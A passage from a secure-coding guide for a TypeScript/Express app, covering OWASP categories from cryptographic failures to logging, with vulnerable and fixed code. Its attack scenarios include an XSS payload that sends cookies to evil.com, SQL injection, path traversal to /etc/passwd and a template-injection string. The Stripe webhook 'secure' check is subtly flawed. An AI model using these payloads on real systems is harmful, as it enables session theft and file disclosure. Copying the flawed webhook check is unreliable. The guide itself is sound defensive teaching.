pnpm add <package-name>
```

**Red flags:**

- Package created recently (<1 month)
- Very few downloads (<1000/week)
- No GitHub repo or inactive
- Obfuscated code
- Suspicious postinstall scripts
- Typo of popular package

### Checklist

- [ ] `pnpm audit` passing (no high/critical vulnerabilities)
- [ ] `pnpm-lock.yaml` committed to version control
- [ ] Dependabot enabled for automated security updates
- [ ] CI pipeline runs `pnpm audit --audit-level=moderate`
- [ ] Critical packages pinned (no `^` or `~`)
- [ ] No `eval()`, `Function()`, or dynamic `require()` usage
- [ ] `.npmrc` configured (`ignore-scripts=true`, `audit=true`)
- [ ] CDN assets use SRI hashes (if applicable)
- [ ] Dependency update policy documented
- [ ] New packages vetted before adding (reputation, maintainer, source review)
- [ ] GitHub Security Advisories monitored

---

## A04: Cryptographic Failures

**Priority:** MODERATE | **Enforcement:** WARN

**CWEs:** CWE-259 Hard-Coded Password, CWE-327 Broken/Risky Crypto, CWE-331 Insufficient Entropy

### Description

Failures related to cryptography (or lack thereof) which often lead to sensitive data exposure. This includes using weak cryptographic algorithms, poor key management, and failing to encrypt sensitive data.

### Common Vulnerabilities

1. **Weak Password Hashing**
   - MD5, SHA1, SHA256 for passwords (not designed for password hashing)
   - Low bcrypt work factor (<10)
   - Plain text passwords

2. **Weak Random Number Generation**
   - `Math.random()` for tokens, API keys, secrets
   - Predictable IDs or session tokens

3. **Insufficient Encryption**
   - Sensitive data stored in plain text
   - No encryption in transit (HTTP instead of HTTPS)
   - Sensitive data in URLs or logs

4. **Poor Key Management**
   - Keys hardcoded in source
   - No key rotation
   - Keys transmitted insecurely

### Attack Scenarios

#### Scenario 1: Weak Password Hashing

```typescript
// ❌ VULNERABLE - SHA256 is NOT for password hashing
import crypto from 'crypto'
const hash = crypto.createHash('sha256').update(password).digest('hex')

// Attack: Rainbow table or brute force
// SHA256 is fast (millions of hashes/sec)
// Result: Passwords cracked in hours
```

#### Scenario 2: Math.random() for Tokens

```typescript
// ❌ VULNERABLE - Predictable random numbers
const token = Math.random().toString(36).substring(7)

// Attack: Predict next token value
// Math.random() uses weak PRNG (not cryptographically secure)
// Result: Token guessing/enumeration
```

#### Scenario 3: Sensitive Data in Logs

```typescript
// ❌ VULNERABLE - Password in logs
logger.info('User login attempt', {
  email: req.body.email,
  password: req.body.password, // LOGGED IN PLAIN TEXT
})

// Attack: Log files compromised
// Result: All user passwords exposed
```

### Prevention Strategies

#### 1. Password Hashing with bcrypt

**Install:**

```bash
pnpm add bcrypt
pnpm add -D @types/bcrypt
```

**Implementation:**

```typescript
// apps/api/src/lib/crypto/password.ts
import bcrypt from 'bcrypt'

const BCRYPT_WORK_FACTOR = Number(process.env.BCRYPT_WORK_FACTOR) || 10

// ✅ SECURE - bcrypt with sufficient work factor
export const hashPassword = async (password: string): Promise<string> => {
  return bcrypt.hash(password, BCRYPT_WORK_FACTOR)
}

export const comparePassword = async (password: string, hash: string): Promise<boolean> => {
  return bcrypt.compare(password, hash)
}

// Usage
const user = await prisma.user.create({
  data: {
    email: req.body.email,
    passwordHash: await hashPassword(req.body.password),
  },
})

// Verification
const isValid = await comparePassword(req.body.password, user.passwordHash)
```

**Work Factor Selection:**

- **10:** Fast, suitable for high-traffic sites (100-200ms per hash)
- **12:** Recommended for most applications (400-600ms per hash)
- **14:** Very secure, slower (1.5-2s per hash)

**Never use:**

- ❌ MD5: `crypto.createHash('md5')` — Broken, fast
- ❌ SHA1: `crypto.createHash('sha1')` — Broken, fast
- ❌ SHA256: `crypto.createHash('sha256')` — Not designed for passwords, too fast

#### 2. Cryptographically Secure Random Generation

```typescript
// apps/api/src/lib/crypto/random.ts
import crypto from 'crypto'

// ✅ SECURE - crypto.randomBytes()
export const generateToken = (): string => {
  return crypto.randomBytes(32).toString('hex') // 256 bits
}

export const generateApiKey = (prefix: string = 'sk_live'): string => {
  const randomPart = crypto.randomBytes(32).toString('hex')
  return `${prefix}_${randomPart}`
}

// ❌ NEVER use Math.random()
const token = Math.random().toString(36) // VULNERABLE
```

**Token/Key Hashing Before Storage:**

```typescript
// apps/api/src/lib/crypto/hash.ts
import crypto from 'crypto'

// ✅ SECURE - SHA-256 for token hashing (one-way)
export const hashToken = (token: string): string => {
  return crypto.createHash('sha256').update(token).digest('hex')
}

// Usage: API Key Creation
export const createApiKey = async (orgId: string, name: string) => {
  const plainKey = generateApiKey('sk_live')
  const hashedKey = hashToken(plainKey)

  const apiKey = await prisma.apiKey.create({
    data: {
      hashedKey, // Store hash only
      name,
      organizationId: orgId,
    },
  })

  // Return plaintext ONCE - never stored
  return { apiKey, plainKey }
}

// Verification
export const verifyApiKey = async (plainKey: string) => {
  const hashedKey = hashToken(plainKey)

  const apiKey = await prisma.apiKey.findUnique({
    where: { hashedKey },
  })

  return apiKey
}
```

#### 3. TLS/HTTPS Enforcement

**Backend (Express):**

```typescript
// apps/api/src/middleware/https-redirect.ts
import { Request, Response, NextFunction } from 'express'

export const enforceHttps = (req: Request, res: Response, next: NextFunction) => {
  if (process.env.NODE_ENV === 'production') {
    const proto = req.headers['x-forwarded-proto'] || req.protocol

    if (proto !== 'https') {
      return res.redirect(301, `https://${req.headers.host}${req.url}`)
    }
  }

  next()
}
```

**Frontend (Vite):**

```typescript
// vite.config.ts (development)
export default defineConfig({
  server: {
    https: {
      key: fs.readFileSync('./certs/key.pem'),
      cert: fs.readFileSync('./certs/cert.pem'),
    },
  },
})
```

#### 4. Secure Cookie Configuration

```typescript
// apps/api/src/controllers/auth.ts
export const login = async (req: Request, res: Response) => {
  // ... authentication logic ...

  const { accessToken, refreshToken } = generateTokens(user.id)

  // ✅ SECURE - httpOnly, secure, sameSite cookies
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true, // Not accessible to JavaScript (XSS protection)
    secure: process.env.NODE_ENV === 'production', // HTTPS only in production
    sameSite: 'strict', // CSRF protection
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
    path: '/api/v1/auth/refresh', // Limit cookie scope
  })

  res.json({ accessToken })
}

// ❌ NEVER store tokens in localStorage (vulnerable to XSS)
// localStorage.setItem('refreshToken', refreshToken)
```

#### 5. Sensitive Data Protection

**❌ NEVER log sensitive data:**

```typescript
// ❌ VULNERABLE
logger.info('User registration', {
  email: req.body.email,
  password: req.body.password, // LOGGED
  creditCard: req.body.creditCard, // LOGGED
})

// ✅ SAFE - Redact sensitive fields
logger.info('User registration', {
  email: req.body.email,
  // password NOT logged
  // creditCard NOT logged
})
```

**❌ NEVER put sensitive data in URLs:**

```typescript
// ❌ VULNERABLE - Password in URL (logged in access logs, browser history)
fetch(`/api/reset-password?token=${token}&password=${newPassword}`)

// ✅ SAFE - Sensitive data in request body
fetch('/api/reset-password', {
  method: 'POST',
  body: JSON.stringify({ token, newPassword }),
})
```

**Encrypt sensitive data at rest (future enhancement):**

```typescript
// For future: encrypt sensitive fields before storage
import { createCipheriv, createDecipheriv, randomBytes } from 'crypto'

const ENCRYPTION_KEY = Buffer.from(process.env.ENCRYPTION_KEY!, 'hex') // 32 bytes
const IV_LENGTH = 16

export const encrypt = (text: string): string => {
  const iv = randomBytes(IV_LENGTH)
  const cipher = createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv)
  const encrypted = Buffer.concat([cipher.update(text), cipher.final()])
  return iv.toString('hex') + ':' + encrypted.toString('hex')
}

export const decrypt = (text: string): string => {
  const [ivHex, encryptedHex] = text.split(':')
  const iv = Buffer.from(ivHex, 'hex')
  const encrypted = Buffer.from(encryptedHex, 'hex')
  const decipher = createDecipheriv('aes-256-cbc', ENCRYPTION_KEY, iv)
  const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()])
  return decrypted.toString()
}
```

### Checklist

- [ ] Passwords hashed with bcrypt (work factor ≥10)
- [ ] Tokens generated with `crypto.randomBytes()`, NEVER `Math.random()`
- [ ] API keys/tokens hashed (SHA-256) before storage
- [ ] Cookies: `httpOnly`, `secure` (production), `sameSite: strict`
- [ ] TLS/HTTPS enforced in production
- [ ] No sensitive data in URLs (use POST body)
- [ ] No sensitive data logged (passwords, tokens, credit cards)
- [ ] Weak algorithms prohibited (MD5, SHA1 for passwords)
- [ ] Encryption keys in environment variables, not hardcoded
- [ ] Key rotation policy documented (future enhancement)

---

## A05: Injection

**Priority:** MODERATE | **Enforcement:** WARN

**CWEs:** CWE-79 XSS, CWE-89 SQL Injection, CWE-73 External Control of Filename, CWE-94 Code Injection

### Description

Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.

### Common Vulnerabilities

1. **SQL Injection**
   - String concatenation in queries
   - `$queryRawUnsafe` with user input
   - NoSQL injection (MongoDB, etc.)

2. **Cross-Site Scripting (XSS)**
   - `dangerouslySetInnerHTML` without sanitization
   - Reflected XSS in error messages
   - Stored XSS in user content

3. **Command Injection**
   - `exec()` with user input
   - File path manipulation
   - Template injection

4. **LDAP/XML/etc. Injection**
   - External entity injection (XXE)
   - LDAP filter injection

### Attack Scenarios

#### Scenario 1: SQL Injection

```typescript
// ❌ VULNERABLE - String concatenation
const email = req.body.email
const user = await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE email = '${email}'`)

// Attack: email = "' OR '1'='1"
// Query: SELECT * FROM users WHERE email = '' OR '1'='1'
// Result: All users returned
```

#### Scenario 2: XSS (React)

```typescript
// ❌ VULNERABLE - Unsanitized HTML
const UserBio = ({ bio }: { bio: string }) => {
  return <div dangerouslySetInnerHTML={{ __html: bio }} />
}

// Attack: bio = "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
// Result: Attacker steals session cookies
```

#### Scenario 3: Command Injection

```typescript
// ❌ VULNERABLE - User input in shell command
import { exec } from 'child_process'

app.get('/logs', (req, res) => {
  const filename = req.query.file
  exec(`cat /var/log/${filename}`, (err, stdout) => {
    res.send(stdout)
  })
})

// Attack: GET /logs?file=../../etc/passwd
// Result: Attacker reads /etc/passwd
```

### Prevention Strategies

#### 1. SQL Injection Prevention

**✅ Use Prisma ORM (parameterized by default):**

```typescript
// ✅ SECURE - Prisma parameterizes automatically
const users = await prisma.user.findMany({
  where: { email: req.body.email },
})

const user = await prisma.user.findUnique({
  where: { id: req.params.userId },
})
```

**⚠️ If raw SQL needed, use parameterized queries:**

```typescript
// ✅ SECURE - Parameterized with template literal
const users = await prisma.$queryRaw`
  SELECT * FROM users WHERE email = ${req.body.email}
`

// ❌ NEVER use $queryRawUnsafe with user input
const users = await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE email = '${req.body.email}'`) // VULNERABLE
```

**NoSQL Injection Prevention (if using MongoDB):**

```typescript
// ❌ VULNERABLE - User input as object
const user = await db.collection('users').findOne({
  email: req.body.email, // If email is object: { $ne: null }
})

// ✅ SECURE - Validate input type with Zod
const EmailSchema = z.object({
  email: z.string().email(),
})

const { email } = EmailSchema.parse(req.body)
const user = await db.collection('users').findOne({ email })
```

#### 2. XSS Prevention

**React (Auto-Escaping):**

```typescript
// ✅ SECURE - React escapes by default
const UserName = ({ name }: { name: string }) => {
  return <div>{name}</div> // Automatically escaped
}

// ❌ VULNERABLE - dangerouslySetInnerHTML
const UserBio = ({ bio }: { bio: string }) => {
  return <div dangerouslySetInnerHTML={{ __html: bio }} />
}

// ✅ SECURE - DOMPurify sanitization
import DOMPurify from 'isomorphic-dompurify'

const SafeBio = ({ bio }: { bio: string }) => {
  const sanitized = DOMPurify.sanitize(bio, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href'],
  })

  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />
}
```

**Content Security Policy (CSP):**

```typescript
// apps/api/src/app.ts
import helmet from 'helmet'

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"], // No inline scripts
        styleSrc: ["'self'"],
        objectSrc: ["'none'"],
        baseUri: ["'self'"],
        upgradeInsecureRequests: [],
      },
    },
  }),
)
```

**Input Validation:**

```typescript
// ✅ SECURE - Zod validates and sanitizes
const UserBioSchema = z.object({
  bio: z.string().max(500).trim(),
})

const { bio } = UserBioSchema.parse(req.body)
```

#### 3. Command Injection Prevention

**❌ NEVER execute shell commands with user input:**

```typescript
// ❌ VULNERABLE
import { exec } from 'child_process'
exec(`git log --author=${req.body.author}`) // VULNERABLE

// ✅ SECURE - Use execFile with array args
import { execFile } from 'child_process'
execFile('git', ['log', '--author', req.body.author], (err, stdout) => {
  // Safe - arguments are not interpreted as shell commands
})

// ✅ BETTER - Use a library instead of shell commands
import simpleGit from 'simple-git'
const git = simpleGit()
const log = await git.log({ '--author': req.body.author })
```

**Path Traversal Prevention:**

```typescript
// ❌ VULNERABLE - User controls file path
import path from 'path'
import fs from 'fs'

app.get('/files/:filename', (req, res) => {
  const filePath = path.join('/uploads', req.params.filename)
  res.sendFile(filePath) // VULNERABLE
})

// Attack: GET /files/../../../etc/passwd
// Result: /etc/passwd exposed

// ✅ SECURE - Validate and sanitize filename
import path from 'path'
import fs from 'fs'

app.get('/files/:filename', (req, res) => {
  const { filename } = req.params

  // Validate filename (no path traversal)
  if (filename.includes('..') || filename.includes('/')) {
    throw new AppError('Invalid filename', 400, 'INVALID_FILENAME')
  }

  // Whitelist allowed characters
  if (!/^[a-zA-Z0-9_-]+\.[a-z]{2,4}$/.test(filename)) {
    throw new AppError('Invalid filename format', 400, 'INVALID_FORMAT')
  }

  const filePath = path.join('/uploads', filename)

  // Verify resolved path is still within /uploads
  if (!filePath.startsWith('/uploads')) {
    throw new AppError('Forbidden', 403, 'FORBIDDEN')
  }

  res.sendFile(filePath)
})
```

#### 4. Template Injection Prevention

**❌ NEVER render user input as template:**

```typescript
// ❌ VULNERABLE - User input as template
import Handlebars from 'handlebars'

const template = Handlebars.compile(req.body.template)
const result = template({ user: { name: 'Alice' } })

// Attack: template = "{{#with 'constructor'}}{{lookup . 'eval'}}('process.exit()'){{/with}}"
// Result: Server crashes or arbitrary code execution

// ✅ SECURE - Pre-defined templates only
const allowedTemplates = {
  welcome: Handlebars.compile('Welcome, {{name}}!'),
  goodbye: Handlebars.compile('Goodbye, {{name}}!'),
}

const template = allowedTemplates[req.body.templateName]
if (!template) {
  throw new AppError('Invalid template', 400, 'INVALID_TEMPLATE')
}

const result = template({ name: req.body.name })
```

### Checklist

- [ ] Prisma ORM used (no raw SQL unless necessary)
- [ ] No `$queryRawUnsafe` with user input
- [ ] React components use auto-escaping (avoid `dangerouslySetInnerHTML`)
- [ ] If HTML rendering needed, use DOMPurify
- [ ] Content-Security-Policy header configured
- [ ] No shell command execution with user input
- [ ] If `exec` needed, use `execFile` with array args
- [ ] File paths validated (no `../` traversal)
- [ ] Input validated with Zod (type + format + whitelist)
- [ ] NoSQL queries validate input types (no objects where strings expected)
- [ ] Templates pre-defined (no user-controlled templates)

---

## A06: Insecure Design

**Priority:** ADVISORY | **Enforcement:** ADVISORY

**CWEs:** CWE-209 Information Exposure, CWE-256 Plaintext Storage, CWE-501 Trust Boundary Violation

### Description

Insecure design represents missing or ineffective control design. It is distinct from insecure implementation - even perfect implementation cannot fix insecure design. This requires threat modeling, secure design patterns, and reference architectures.

### Common Vulnerabilities

1. **Missing Threat Modeling**
   - Features added without security review
   - No consideration of abuse scenarios
   - Missing rate limiting

2. **Business Logic Flaws**
   - Insufficient workflow validation
   - Race conditions
   - Missing transaction boundaries

3. **Trust Boundary Violations**
   - Trusting client-side validation
   - Trusting URL parameters
   - No abuse prevention

### Prevention Strategies

#### 1. Threat Modeling (Per Feature)

For each new feature, ask:

**1. What assets are we protecting?**

- User data (PII, passwords, emails)
- Organization data (members, API keys, sensitive docs)
- System resources (database, CPU, bandwidth)

**2. Who are the threat actors?**

- External attackers (no account, scanning for vulnerabilities)
- Malicious users (authenticated, attempting abuse)
- Compromised accounts (stolen credentials)
- Insider threats (malicious admins, developers)

**3. What are the attack vectors?**

- API endpoints (IDOR, injection, rate limiting bypass)
- Database queries (SQL injection, data leakage)
- File uploads (malware, path traversal, XXE)
- Email invitations (spam, phishing)

**4. What are the mitigations?**

- Input validation (Zod schemas)
- RBAC (requireRole middleware)
- Rate limiting (per-user, per-org, per-IP)
- Audit logging (security events)
- Abuse detection (excessive invitations, org creation)

#### 2. Rate Limiting & Abuse Prevention

**Install:**

```bash
pnpm add express-rate-limit
```

**Implementation:**

```typescript
// apps/api/src/config/rate-limit.ts
import rateLimit from 'express-rate-limit'

// ✅ SECURE - Rate limit auth endpoints
export const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // Max 5 requests per window
  message: 'Too many login attempts, please try again later',
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => req.ip, // Rate limit by IP
})

// Expensive operations (per-org)
export const expensiveLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 100, // Max 100 requests per hour
  keyGenerator: (req) => req.tenantId || req.ip,
})

// General API (per-user)
export const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 1000, // Max 1000 requests per window
  keyGenerator: (req) => req.user?.id || req.ip,
})

// Usage
import { authLimiter, expensiveLimiter, apiLimiter } from './config/rate-limit'

router.post('/api/v1/auth/login', authLimiter, AuthController.login)
router.post(
  '/api/v1/orgs/:slug/export',
  authenticate,
  requireRole('ADMIN'),
  expensiveLimiter,
  ExportController.export,
)
router.use('/api/v1', apiLimiter) // Apply to all API routes
```

#### 3. Business Logic Validation

**Example: Invitation Abuse Prevention**

```typescript
// apps/api/src/controllers/invitations.ts
export const createInvitation = async (req: Request, res: Response) => {
  const { email, role } = req.body
  const tenantId = req.tenantId!
  const invitedById = req.user!.id

  // ✅ SECURE - Prevent abuse scenarios

  // 1. Check if user is already a member
  const existingMember = await prisma.membership.findFirst({
    where: {
      organizationId: tenantId,
      user: { email },
    },
  })

  if (existingMember) {
    throw new AppError('User is already a member', 409, 'ALREADY_MEMBER')
  }

  // 2. Check if invitation already exists
  const existingInvitation = await prisma.invitation.findFirst({
    where: {
      email,
      organizationId: tenantId,
      expiresAt: { gte: new Date() }, // Not expired
    },
  })

  if (existingInvitation) {
    throw new AppError('Invitation already sent', 409, 'INVITATION_EXISTS')
  }

  // 3. Limit invitations per org (abuse prevention)
  const recentInvitationsCount = await prisma.invitation.count({
    where: {
      organizationId: tenantId,
      createdAt: {
        gte: new Date(Date.now() - 24 * 60 * 60 * 1000), // Last 24 hours
      },
    },
  })

  if (recentInvitationsCount >= 50) {
    throw new AppError('Too many invitations sent', 429, 'TOO_MANY_INVITATIONS')
  }

  // 4. Validate email domain (optional: whitelist/blacklist)
  const emailDomain = email.split('@')[1]
  if (emailDomain === 'disposable-email.com') {
    throw new AppError('Disposable email not allowed', 400, 'INVALID_EMAIL')
  }

  // Create invitation
  const token = generateToken()
  const hashedToken = hashToken(token)
  const expiresAt = new Date(Date.now() + 72 * 60 * 60 * 1000) // 72 hours

  const invitation = await prisma.invitation.create({
    data: {
      email,
      role,
      hashedToken,
      expiresAt,
      organizationId: tenantId,
      invitedById,
    },
  })

  // Send email (async, don't block response)
  sendInvitationEmail(email, token, tenantId).catch((err) => {
    logger.error('Failed to send invitation email', { error: err, email })
  })

  res.status(201).json({ invitation })
}
```

#### 4. Race Condition Prevention

**Use database transactions for critical operations:**

```typescript
// ✅ SECURE - Atomic ownership transfer
export const transferOwnership = async (
  orgId: string,
  newOwnerId: string,
  currentOwnerId: string,
) => {
  await prisma.$transaction([
    // 1. Demote current owner to admin
    prisma.membership.update({
      where: {
        userId_organizationId: {
          userId: currentOwnerId,
          organizationId: orgId,
        },
      },
      data: { role: 'ADMIN' },
    }),

    // 2. Promote new owner
    prisma.membership.update({
      where: {
        userId_organizationId: {
          userId: newOwnerId,
          organizationId: orgId,
        },
      },
      data: { role: 'OWNER' },
    }),
  ])
}

// ❌ VULNERABLE - Race condition (two owners temporarily)
await prisma.membership.update({
  where: { userId_organizationId: { userId: newOwnerId, organizationId: orgId } },
  data: { role: 'OWNER' },
})
// ⚠️ Race condition window here - two owners exist
await prisma.membership.update({
  where: { userId_organizationId: { userId: currentOwnerId, organizationId: orgId } },
  data: { role: 'ADMIN' },
})
```

### Checklist

- [ ] Threat modeling done for new features (assets, actors, vectors, mitigations)
- [ ] Rate limiting on auth endpoints (5 per 15 min)
- [ ] Rate limiting on expensive operations (per-org quotas)
- [ ] Invitation abuse prevention (limit per org per day)
- [ ] Business logic validated (can't invite existing member, can't delete non-existent resource)
- [ ] Race conditions prevented (transactions for critical operations)
- [ ] No trust in client-side validation (always validate server-side)
- [ ] Abuse scenarios considered (excessive requests, resource exhaustion)

---

## A07: Authentication Failures

**Priority:** MODERATE | **Enforcement:** WARN

**CWEs:** CWE-287 Improper Authentication, CWE-259 Hard-Coded Password, CWE-522 Insufficiently Protected Credentials

### Description

Authentication failures occur when the application incorrectly confirms user identity, session management, or access credentials. This includes weak passwords, credential stuffing, session fixation, and insecure password recovery.

### Common Vulnerabilities

1. **Weak Password Requirements**
   - No minimum length
   - No complexity requirements
   - No check against common passwords

2. **Insecure Session Management**
   - Tokens in localStorage (XSS vulnerable)
   - No token expiration
   - No token rotation

3. **Credential Stuffing/Brute Force**
   - No rate limiting
   - No account lockout
   - No CAPTCHA

4. **Insecure Password Reset**
   - Weak reset tokens
   - No expiration
   - Token reuse allowed

### Prevention Strategies

#### 1. Strong Password Policy

```typescript
// apps/api/src/lib/validation/auth.ts
import { z } from 'zod'

export const PasswordSchema = z
  .string()
  .min(8, 'Password must be at least 8 characters')
  .max(128, 'Password must not exceed 128 characters')
  .regex(/[A-Z]/, 'Password must contain at least one uppercase letter')
  .regex(/[a-z]/, 'Password must contain at least one lowercase letter')
  .regex(/[0-9]/, 'Password must contain at least one number')
  .regex(/[^A-Za-z0-9]/, 'Password must contain at least one special character')
  .refine((password) => !commonPasswords.includes(password.toLowerCase()), 'Password is too common')

const commonPasswords = [
  'password',
  'password123',
  '12345678',
  'qwerty',
  'abc123',
  // ... top 10,000 common passwords
]

export const RegisterSchema = z.object({
  name: z.string().min(1).max(100),
  email: z.string().email(),
  password: PasswordSchema,
})
```

#### 2. JWT Best Practices

**Short-lived access tokens + long-lived refresh tokens:**

```typescript
// apps/api/src/lib/auth/tokens.ts
import jwt from 'jsonwebtoken'
import { env } from '../config/env'

const ACCESS_TOKEN_EXPIRY = env.JWT_ACCESS_EXPIRY || '15m' // 15 minutes
const REFRESH_TOKEN_EXPIRY = env.JWT_REFRESH_EXPIRY || '7d' // 7 days

export const generateTokens = (userId: string) => {
  const accessToken = jwt.sign({ userId, type: 'access' }, env.JWT_SECRET, {
    expiresIn: ACCESS_TOKEN_EXPIRY,
  })

  const refreshToken = jwt.sign({ userId, type: 'refresh' }, env.JWT_REFRESH_SECRET, {
    expiresIn: REFRESH_TOKEN_EXPIRY,
  })

  return { accessToken, refreshToken }
}

export const verifyAccessToken = (token: string) => {
  try {
    const payload = jwt.verify(token, env.JWT_SECRET)
    return payload as { userId: string; type: 'access' }
  } catch (error) {
    throw new AppError('Invalid token', 401, 'INVALID_TOKEN')
  }
}

export const verifyRefreshToken = (token: string) => {
  try {
    const payload = jwt.verify(token, env.JWT_REFRESH_SECRET)
    return payload as { userId: string; type: 'refresh' }
  } catch (error) {
    throw new AppError('Invalid refresh token', 401, 'INVALID_REFRESH_TOKEN')
  }
}
```

**Refresh token rotation:**

```typescript
// apps/api/src/controllers/auth.ts
export const refreshAccessToken = async (req: Request, res: Response) => {
  const oldRefreshToken = req.cookies.refreshToken

  if (!oldRefreshToken) {
    throw new AppError('No refresh token', 401, 'NO_REFRESH_TOKEN')
  }

  // Verify old token
  const payload = verifyRefreshToken(oldRefreshToken)

  // Check if token has been revoked (optional: store in Redis)
  const isRevoked = await redis.exists(`revoked:${oldRefreshToken}`)
  if (isRevoked) {
    throw new AppError('Token revoked', 401, 'TOKEN_REVOKED')
  }

  // Revoke old token (prevent reuse)
  await redis.setex(`revoked:${oldRefreshToken}`, 7 * 24 * 60 * 60, '1')

  // Issue new pair
  const { accessToken, refreshToken } = generateTokens(payload.userId)

  // Set new refresh token in cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000,
    path: '/api/v1/auth/refresh',
  })

  res.json({ accessToken })
}
```

#### 3. Rate Limiting (Brute Force Prevention)

**See A06 for rate limiting implementation. Apply to:**

- Login: 5 attempts per 15 minutes (per IP)
- Register: 3 accounts per hour (per IP)
- Password reset: 3 requests per hour (per email)

#### 4. Secure Password Reset

```typescript
// apps/api/src/controllers/auth.ts
export const requestPasswordReset = async (req: Request, res: Response) => {
  const { email } = req.body

  const user = await prisma.user.findUnique({ where: { email } })

  // ✅ SECURE - Don't reveal if user exists
  if (!user) {
    // Return success anyway (prevent email enumeration)
    return res.json({ message: 'If email exists, reset link sent' })
  }

  // Generate secure token
  const token = generateToken()
  const hashedToken = hashToken(token)
  const expiresAt = new Date(Date.now() + 60 * 60 * 1000) // 1 hour

  // Store token
  await prisma.passwordResetToken.create({
    data: {
      hashedToken,
      expiresAt,
      userId: user.id,
    },
  })

  // Send email
  await sendPasswordResetEmail(email, token)

  res.json({ message: 'If email exists, reset link sent' })
}

export const resetPassword = async (req: Request, res: Response) => {
  const { token, newPassword } = req.body

  const hashedToken = hashToken(token)

  // Find token
  const resetToken = await prisma.passwordResetToken.findUnique({
    where: { hashedToken },
    include: { user: true },
  })

  if (!resetToken) {
    throw new AppError('Invalid or expired token', 400, 'INVALID_TOKEN')
  }

  // Check expiration
  if (resetToken.expiresAt < new Date()) {
    throw new AppError('Token expired', 400, 'TOKEN_EXPIRED')
  }

  // Check if already used
  if (resetToken.usedAt) {
    throw new AppError('Token already used', 400, 'TOKEN_USED')
  }

  // Update password + mark token as used
  await prisma.$transaction([
    prisma.user.update({
      where: { id: resetToken.userId },
      data: { passwordHash: await hashPassword(newPassword) },
    }),
    prisma.passwordResetToken.update({
      where: { id: resetToken.id },
      data: { usedAt: new Date() },
    }),
  ])

  // Invalidate all user's sessions (optional)
  await revokeAllUserTokens(resetToken.userId)

  res.json({ message: 'Password reset successful' })
}
```

### Checklist

- [ ] Password policy enforced (8+ chars, mixed case, numbers, symbols)
- [ ] Common passwords rejected (top 10k list)
- [ ] Access tokens short-lived (≤15 minutes)
- [ ] Refresh tokens httpOnly cookies (not localStorage)
- [ ] Refresh token rotation implemented
- [ ] Rate limiting on login (5 per 15 min)
- [ ] Rate limiting on password reset (3 per hour)
- [ ] Password reset tokens single-use, time-limited (1 hour)
- [ ] Password reset doesn't reveal if email exists
- [ ] All sessions invalidated on password change
- [ ] MFA available (future enhancement)

---

## A08: Software and Data Integrity Failures

**Priority:** ADVISORY | **Enforcement:** ADVISORY

**CWEs:** CWE-502 Deserialization of Untrusted Data, CWE-345 Insufficient Verification of Data Authenticity

### Description

Code and infrastructure that does not protect against integrity violations. This includes unsigned/unverified software updates, insecure CI/CD pipelines, and untrusted deserialization.

### Prevention Strategies

#### 1. JWT Signature Verification

```typescript
// ✅ SECURE - Always verify JWT signatures
import jwt from 'jsonwebtoken'

export const verifyAccessToken = (token: string) => {
  try {
    // jwt.verify() checks signature + expiration
    const payload = jwt.verify(token, env.JWT_SECRET)
    return payload as { userId: string }
  } catch (error) {
    throw new AppError('Invalid token', 401, 'INVALID_TOKEN')
  }
}

// ❌ NEVER use jwt.decode() for auth (no verification)
const payload = jwt.decode(token) // VULNERABLE - no signature check
```

#### 2. Webhook Signature Validation (Future: Stripe)

```typescript
// apps/api/src/controllers/webhooks.ts
import crypto from 'crypto'

export const handleStripeWebhook = async (req: Request, res: Response) => {
  const signature = req.headers['stripe-signature']
  const webhookSecret = env.STRIPE_WEBHOOK_SECRET

  if (!signature) {
    throw new AppError('No signature', 400, 'NO_SIGNATURE')
  }

  // ✅ SECURE - Verify webhook signature
  const expectedSignature = crypto
    .createHmac('sha256', webhookSecret)
    .update(req.body)
    .digest('hex')

  if (signature !== expectedSignature) {
    throw new AppError('Invalid signature', 400, 'INVALID_SIGNATURE')
  }

  // Process webhook event
  const event = JSON.parse(req.body)
  // ...

  res.json({ received: true })
}
```

### Checklist

- [ ] JWT tokens verified (not just decoded)
- [ ] Webhook signatures validated (future: Stripe)
- [ ] No unsafe deserialization (JSON only, no eval())
- [ ] CI/CD artifacts signed (future enhancement)

---

## A09: Security Logging and Alerting Failures

**Priority:** ADVISORY | **Enforcement:** ADVISORY

**CWEs:** CWE-778 Insufficient Logging, CWE-223 Omission of Security-Relevant Information

### Description

Insufficient logging and monitoring allow attackers to achieve their goals without being detected. Logs should capture security-relevant events for incident response and forensics.

### Prevention Strategies

#### 1. Security Event Logging

```typescript
// apps/api/src/lib/logger.ts
import winston from 'winston'

export const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || 'info',
  format: winston.format.combine(winston.format.timestamp(), winston.format.json()),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' }),
  ],
})

// Security events to log
export const logSecurityEvent = (event: string, details: Record<string, any>) => {
  logger.warn('Security event', {
    event,
    ...details,
    timestamp: new Date().toISOString(),
  })
}

// Usage
logSecurityEvent('FAILED_LOGIN', {
  email: req.body.email,
  ip: req.ip,
  userAgent: req.headers['user-agent'],
})

logSecurityEvent('AUTHORIZATION_FAILURE', {
  userId: req.user.id,
  resource: req.url,
  requiredRole: 'ADMIN',
  userRole: req.membership.role,
})
```

#### 2. Events to Log

**Security-relevant events:**

- Failed login attempts
- Successful logins (for anomaly detection)
- Authorization failures (403 responses)
- Privilege escalation attempts
- Password changes
- Email changes
